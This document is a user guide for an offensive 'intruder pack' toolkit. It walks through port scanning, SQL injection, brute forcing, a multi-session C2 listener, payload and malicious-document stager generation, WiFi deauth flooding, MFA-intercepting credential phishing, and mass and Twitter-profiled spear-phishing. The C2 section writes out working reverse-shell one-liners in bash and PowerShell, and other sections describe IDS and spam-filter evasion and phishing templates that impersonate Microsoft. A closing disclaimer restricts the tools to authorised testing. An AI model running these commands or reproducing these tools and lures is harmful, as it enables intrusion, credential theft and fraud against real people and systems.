# SYMBIOTE – Intruder Pack Tools Guide
> Developer: **D8V1D777** | Version: 3.0 | Platform: Windows/Linux  
> All tools are native Python – no external binaries required. Tools accessible via the **INFILTRATION TOOLKIT** page.

---

## Tool Index
| # | Tool ID | Linux Equivalent | What It Does |
|---|---------|-----------------|--------------|
| 1 | NMAP | `nmap` | Port scan, banner grab, OS fingerprint |
| 2 | SHODAN | `shodan` CLI | OSINT – internet-facing asset intelligence |
| 3 | PYSHARK | `tcpdump / tshark` | Live packet capture & protocol analysis |
| 4 | SQLMAP | `sqlmap` | SQL injection (Error/Boolean/Union/Time) |
| 5 | HYDRA | `hydra` | Multi-mode HTTP brute-force with CSRF bypass |
| 6 | METASPLOIT | `nc` / `msfconsole` | Multi-session C2 listener (XOR encrypted) |
| 7 | PWNTOOLS | `pwntools` | Binary exploit template generator |
| 8 | MONA | `mona.py` / `cyclic` | Cyclic pattern generator for offset finding |
| 9 | GOBUSTER | `gobuster / ffuf` | Deep recursive directory fuzzing |
| 10 | MSFVENOM | `msfvenom` | Payload wizard – shells, stagers, encoders |
| 11 | REVERSE_SHELL | `bash -i >& ...` | One-liner reverse shell generator |
| 12 | MALDOC | `macro_pack` | Word macro/LNK/HTA initial access stager |
| 13 | WIFI_PUMP | `aircrack-ng` | Passive WiFi scan + deauth flood |
| 14 | CRED_HARVESTER | `evilginx2` | MFA-aware credential phishing engine |
| 15 | BT_SCAN | `bluetoothctl / hcitool` | Persistent Bluetooth device hunter |
| 16 | SMTP_PHISH | `setoolkit` | Mass social engineering email sender |
| 17 | TWITTER_PHISH | `tweepy / recon-ng` | Twitter-tailored spear-phishing engine |

---

## 1. NMAP – Port Scanner
**Linux equiv:** `nmap -sV -T4 --open -p- <target>`

### How to Use
1. Click **NMAP** in the Toolkit
2. Enter target IP/domain e.g. `192.168.1.1` or `scanme.nmap.org`
3. The tool scans **42+ common ports** in parallel (50 threads)

### What You Get
- Open ports with service name (`22/tcp SSH`)
- Banner grabbed from each port (`OpenSSH_8.9p1`)
- OS fingerprint via ICMP TTL (`Linux ~64` / `Windows ~128`)
- Per-port vulnerability hints (EternalBlue, BlueKeep, Redis no-auth, etc.)

### Example Output
```
[NET] Target resolved: 192.168.1.10 | Scanning 42 ports...
[NET] OS Fingerprint: Linux/macOS (TTL ~64)
[OPEN] 22/tcp SSH | SSH-2.0-OpenSSH_8.9p1 Ubuntu
  ↳ Brute-force via Hydra. Check for old OpenSSH versions (CVE-2023-38408)
[OPEN] 80/tcp HTTP | HTTP/1.1 200 OK
[OPEN] 3306/tcp MySQL
[NET] Scan complete: 3 open ports found.
```

---

## 2. SHODAN – OSINT Explorer
**Linux equiv:** `shodan host <ip>`

### How to Use
1. Go to **Settings** → enter your Shodan API key (free at shodan.io)
2. Click **SHODAN** → enter target IP
3. Tool queries Shodan for open ports, banners, CVEs, geo-IP

### What You Get
- OS, organisation, ISP, ASN
- All internet-facing ports with banners
- Known CVEs associated with the host

### Example Output
```
[SHODAN] OS: Windows Server 2019
[SHODAN] ISP: Amazon.com
[PORT 80] Apache httpd 2.4.41
[PORT 443] Service detected
```

---

## 3. PYSHARK – Packet Sniffer
**Linux equiv:** `tshark -i eth0`

### How to Use
1. Ensure TShark / Wireshark is installed on the system
2. Click **PYSHARK** → enter interface name (`eth0`, `Wi-Fi`, or leave blank for default)
3. First 5 packets are captured and displayed

### What You Get
- Timestamp, protocol layer, and packet size
- Layer-by-layer protocol decoding via TShark engine

### Example Output
```
Listening on Wi-Fi... capturing first 5 packets.
[PKT] 2026-03-02 10:00:01 | TCP | 74 bytes
[PKT] 2026-03-02 10:00:01 | DNS | 88 bytes
[PKT] 2026-03-02 10:00:02 | TLS | 1320 bytes
```

---

## 4. SQLMAP – SQL Injection Engine
**Linux equiv:** `sqlmap -u "http://site.com/page?id=1" --level=5 --risk=3`

### How to Use
1. Click **SQLMAP** → enter URL with parameters, e.g.:  
   `http://testphp.vulnweb.com/artists.php?artist=1`
2. The engine runs **4 injection techniques in sequence** per parameter

### Techniques Covered
| Technique | Trigger Example |
|-----------|----------------|
| Error-Based | `' OR '1'='1` reveals MySQL error string |
| Boolean Blind | `AND 1=1` vs `AND 1=2` diff in response length |
| Union-Based | `UNION SELECT NULL,NULL--` column enumeration |
| Time-Based | `SLEEP(5)` / `WAITFOR DELAY '0:0:5'` delay detection |

### Example Output
```
[SQLi] Testing param: artist | Baseline: 4821B
[SQLi][ERROR/MySQL] 'artist' → ' Fingerprint: MySQL
[SQLi][BOOLEAN] 'artist' → differential 421B / status 200 vs 200
[SQLi][UNION] 'artist' → 3 column(s) confirmed
```

---

## 5. HYDRA – Brute Force Engine
**Linux equiv:** `hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"`

### How to Use
1. Click **HYDRA** → choose `HTTP Basic` or `HTTP Form (POST)`
2. Enter target URL, username, wordlist path
3. For Form mode: enter field names and failure message

### Features
- **CSRF token auto-extraction** – parses and includes anti-forgery tokens
- **Session persistence** – reuses cookies to bypass basic session limits
- **User-Agent rotation** – randomises between 3 real browser UAs
- **Multi-threaded** – 10 parallel attempts by default

### Example
```
Target: http://192.168.1.5/login
User: admin
Wordlist: /wordlists/rockyou.txt
Failure: "Invalid password"

[HYDRA] Detected CSRF Token: _token
[HYDRA] Attempt 1023/14344
[SUCCESS] Credentials Found: admin:password123
```

---

## 6. METASPLOIT – C2 Listener (Multi-Session)
**Linux equiv:** `use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT 4444; run`

### How to Use
1. Click **METASPLOIT** → enter listen port (e.g. `4444`)
2. Listener starts in background, waits for incoming shells
3. Use **Session ID** prompt to interact with a specific session
4. Type commands to send to the connected shell

### Features
- All traffic is **XOR-obfuscated** to evade simple IDS
- Multiple sessions tracked with SID (Session ID)
- Real-time I/O loop shows incoming shell output

### Connecting a Shell
On victim (Linux):
```bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```
On victim (Windows PowerShell):
```powershell
$c=New-Object Net.Sockets.TCPClient("YOUR_IP",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sb3=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}
```

---

## 7. PWNTOOLS – Binary Exploit Template
**Linux equiv:** `pwn template ./binary --host 127.0.0.1 --port 1337`

### How to Use
Click **PWNTOOLS** → fill in the wizard:
- Architecture (`amd64` / `i386`)
- Binary path or remote host/port
- Exploit type (ROP chain, ret2libc, shellcode)
- NX/Stack canary/PIE settings

The wizard outputs a ready-to-run pwntools Python skeleton.

---

## 8. MONA – Pattern Generator
**Linux equiv:** `python3 -c "from pwn import *; print(cyclic(1000))"`

### How to Use
Click **MONA** → enter pattern length (e.g. `1000`)

### Workflow
1. Send pattern to crash target application
2. Read EIP/RIP value from debugger
3. Use `cyclic_find(0x61616178)` to find exact offset

```
[MONA] Generated Pattern (1000 bytes): aaaabaaacaaadaaaeaaafaaagaaaha...
```

---

## 9. GOBUSTER – Deep Directory Fuzzer
**Linux equiv:** `gobuster dir -u http://site.com -w /usr/share/seclists/Discovery/Web-Content/common.txt`

### How to Use
Click **GOBUSTER** → enter target URL. Optionally set a wordlist path.

### Features
- **250+ built-in sensitive paths** (`.env`, `.git/config`, `admin/`, etc.)
- **Recursive fuzzing** – auto-dives into discovered directories
- Reports HTTP status, size, and access type (`ACCESS / REDIRECT / FORBIDDEN`)

### Example Output
```
[FUZZ] Starting deep discovery on http://192.168.1.5 (52 paths)...
[FUZZ][ACCESS] /.env  [247B]
[FUZZ][ACCESS] /.git/config  [89B]
[FUZZ][FORBIDDEN] /admin/  [1024B]
[FUZZ] Recursing into 1 discovered dirs...
[FUZZ] Complete: 3 entries found.
```

---

## 10 & 11. MSFVENOM / REVERSE_SHELL – Payload Wizard
**Linux equiv:** `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe`

### How to Use
Click **MSFVENOM** or **REVERSE_SHELL** → use the Payload Wizard to:
- Select OS (Windows/Linux/macOS)
- Select shell type (Meterpreter, Netcat, PowerShell, Python, Bash)
- Enter LHOST / LPORT
- Select encoding format (raw, base64, hex, py-bytes)

The wizard generates the full payload string or command ready to use.

---

## 12. MALDOC – Malicious Document Stager
**Linux equiv:** `macro_pack -t SHELLCODE -o -G malicious.docm`

### How to Use
Click **MALDOC** → enter LHOST and LPORT. Three templates are generated:

| Template | Trigger | Vector |
|----------|---------|--------|
| Word Macro | `AutoOpen()` | Base64 PowerShell stager |
| LNK Shortcut | Double-click | PowerShell one-liner |
| HTA File | Open in browser | VBScript Shell.Exec |

Paste the VBA output into a Word macro editor or deliver via phishing email.

---

## 13. WIFI_PUMP – Wireless Strike Engine
**Linux equiv:** `airodump-ng wlan0mon` / `aireplay-ng --deauth 100 -a BSSID wlan0mon`

### How to Use – Passive Scan
1. Click **WIFI_PUMP** → select `Passive Scan`
2. Enter interface name (`wlan0` on Linux, `Wi-Fi` on Windows)

**Windows fallback**: If monitor mode is unavailable, the tool automatically falls back to `netsh wlan show networks mode=bssid` to enumerate nearby APs.

### How to Use – Deauth Strike
1. Click **WIFI_PUMP** → select `Deauth Strike`
2. Enter target BSSID (from scan) and Gateway MAC
3. Sends **500 deauth packets at 0.05s intervals** to force client reconnection

### Example Output
```
WIFI: Monitor mode unavailable. Falling back to netsh reconnaissance...
[WIFI] Raw spectral data captured via netsh.
TARGET_IDENTIFIED: HomeNetwork [a4:c3:f0:11:22:33]
WIFI: Executing deauth flood against a4:c3:f0:11:22:33...
WIFI: Flood sequence complete. Handshake capture phase likely triggered.
```

---

## 14. CRED_HARVESTER – Phishing Engine (MFA-Aware)
**Linux equiv:** `evilginx2` / `gophish`

### How to Use
1. Click **CRED_HARVESTER** → choose port (e.g. `8080`)
2. Select template: `Microsoft_Modern` or `LinkedIn`
3. Share the link `http://YOUR_IP:8080` with the target

### 2-Phase MFA Interception Flow
```
Phase 1: Target enters email + password → captured
Phase 2: Automatically redirects to Microsoft Authenticator code page
         → 2FA/MFA code captured in real time
```

### Example Output
```
PHISH_ENGINE: Active on port 8080. Logic: Microsoft_Modern -> MFA_Intercept
[09:45:12] IP:192.168.1.22 | INTELLIGENCE: user=victim@corp.com&pass=Passw0rd! | UA:Chrome/120
[09:45:14] IP:192.168.1.22 | INTELLIGENCE: mfa_code=847291 | UA:Chrome/120
TIP: Point target to http://192.168.1.100:8080
```

---

## 15. BT_SCAN – Persistent Bluetooth Device Hunter
**Linux equiv:** `bluetoothctl scan on` / `hcitool scan`

### How to Use
1. Click **BT_SCAN** → enter **max scan cycles** (`0` = run forever)
2. Enter **interval** between scans in seconds (default `5s`)
3. The inquiry loop starts in a background thread
4. **Click BT_SCAN again** → stops the running inquiry

### 3-Layer Discovery Engine
| Layer | Method | Works When |
|-------|--------|-----------|
| Primary | `bluetooth.discover_devices()` via **PyBluez** | PyBluez installed + BT adapter present |
| Win Fallback | PowerShell `Get-PnpDevice -Class Bluetooth` | Always on Windows (lists paired devices) |
| Linux Fallback | `hcitool scan --flush` | BlueZ installed on Linux |

### Install PyBluez (for full BSSID/MAC discovery)
```bash
pip install pybluez
# Windows may also need: pip install pypiwin32
```

### Example Output
```
[BT] Persistent Bluetooth Inquiry started. Press STOP to terminate.
[BT] === Inquiry Cycle #1 ===
[BT][NEW] iPhone 14 Pro       | A0:B1:C2:D3:E4:F5
[BT][NEW] JBL Flip 6          | 11:22:33:44:55:66
[BT][NEW] <unknown>           | AA:BB:CC:DD:EE:FF
[BT] === Inquiry Cycle #2 ===
[BT][SEE] iPhone 14 Pro       | A0:B1:C2:D3:E4:F5    ← already seen, tracked
[BT][NEW] Galaxy Buds Pro     | 77:88:99:AA:BB:CC    ← new device appeared
[BT] === Inquiry Cycle #3 ===
...
```

### MAC → Friendly Name Lookup (Standalone)
```python
from BluetoothEngine import BluetoothEngine
name = BluetoothEngine.lookup_name("A0:B1:C2:D3:E4:F5")
print(name)  # "iPhone 14 Pro"
```

---

## 16. SMTP_PHISH – Mass Social Engineering (Email)
**Linux equiv:** `setoolkit` (Social Engineering Toolkit)

### How to Use
1. Click **SMTP_PHISH** → enter the **Target Email**. (This is used for single-target UI spear-phishing. It also supports bulk internal logic).
2. Enter your **Gmail Address** (attacker's sending address).
3. Enter your **App Password** (16 characters, generated from Google Account > Security > 2-Step Verification).
4. Select a built-in **Template**:
   - `IT-Support`: "Password Expiry Notice" (Urgency)
   - `Invoice`: "Payment Confirmation Required" (Financial)
   - `Account-Suspended`: "Unusual Activity Detected" (Fear)
5. Enter your **Phishing URL** (e.g., your IP running `CRED_HARVESTER` on port 8080).

### What Happens
1. The engine attempts SMTP authentication with `smtp.gmail.com:587` (TLS).
2. **Dynamic Injection:** It resolves the target email into a capitalized name (e.g., `john.doe@` → `John Doe`) and seamlessly injects it into the HTML template alongside random Invoice IDs and amounts.
3. The email is built as an RFC-compliant `MIMEMultipart` (HTML + plain text fallback) bypassing basic spam rules.
4. **Sent Log:** Success or failure logs are recorded and auto-exported to `phish_log.json` at completion.

### Example Console Output
```
[PHISH] Initializing SMTP Campaign against victim@corp.com...
[PHISH] SMTP auth OK: smtp.gmail.com:587
[PHISH] Mass campaign starting → 1 targets | Template: IT-Support
[PHISH][10:55:12] ✓ Sent → victim@corp.com
[PHISH] Campaign complete → Sent:1 | Failed:0
[PHISH] Campaign log saved to phish_log.json
```

---

## 17. TWITTER_PHISH – Twitter Spear Phish
**Linux equiv:** `tweepy / recon-ng`

### How to Use
1. Click **TWITTER_PHISH** in the Toolkit.
2. Enter the **Target Twitter Handle** (e.g., `elonmusk`).
3. Enter the **Target Email** to receive the phish.
4. Enter your **SMTP Credentials** (Gmail + App Password).
5. Enter the **Phishing URL**.

### Intelligence Mining Logic
The engine performs an advanced OSINT recon on the target profile:
- **Interest Extraction:** Scans tweets for common hashtags (#CyberSecurity, #AI).
- **Network Analysis:** Identifies frequent mentions (@mentions) to build social proof.
- **Link Profiling:** Notes external links shared by the user to establish rapport.
- **Location Mapping:** Uses "twitter_locate" logic to find the user's city.

### Tailored Phishing Lure
The tool automatically crafts a semi-personalized email that references:
- A hashtag the user follows.
- A person the user interacts with.
- The user's discovered location.
- A believable reason to click based on their profile activity.

### Example Output
```
[TWITTER] Starting spear-phishing sequence for @elonmusk...
[TWITTER] Fetching profile information for @elonmusk...
[TWITTER] Targeted intelligence gathered for @elonmusk.
[TWITTER] Crafting individualized lure for victim@example.com...
[TWITTER] Spear Phish SENT successfully to victim@example.com!
```

---

## Quick Start: Typical Red Team Flow

```
1. NMAP          → Find open ports on 192.168.1.10
2. SHODAN        → Gather internet intel on public IP
3. BT_SCAN       → Map nearby Bluetooth devices
4. TWITTER_PHISH → Recon target and send tailored spear-phish
5. GOBUSTER      → Find exposed .env / admin/ on web server
6. SQLMAP        → Test ?id= parameter for SQL injection
7. HYDRA         → Brute-force login portal
8. METASPLOIT    → Catch reverse shell on port 4444
9. CRED_HARVESTER→ Clone Microsoft login to harvest MFA
```

---

> **Legal Disclaimer**: These tools are for **authorised penetration testing and security research only**.  
> Always obtain explicit written permission before testing any system.

